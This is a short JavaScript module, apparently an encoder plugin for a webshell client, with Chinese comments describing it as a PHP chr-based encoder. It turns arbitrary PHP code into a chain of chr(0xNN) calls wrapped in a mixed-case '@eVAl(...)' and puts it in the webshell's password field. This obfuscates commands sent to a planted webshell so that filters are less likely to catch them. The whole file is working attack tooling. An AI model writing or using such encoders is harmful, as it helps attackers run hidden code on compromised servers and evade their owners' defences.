/**
 * php::chr16编码器
 * ? 利用php的chr函数进行编码处理
 */

'use strict'

module.exports = (pwd, data, ext = null) => {
  // 编码函数
  const encode = (php) => {
    let ret = [];
    let i = 0;
    while (i < php.length) {
      ret.push(php[i].charCodeAt().toString(16));
      i++;
    }
    return `@eVAl(cHr(0x${ret.join(').ChR(0x')}));`;
  }

  // 编码并去除多余数据
  data[pwd] = encode(data._);
  delete data._;

  // 返回数据
  return data;
}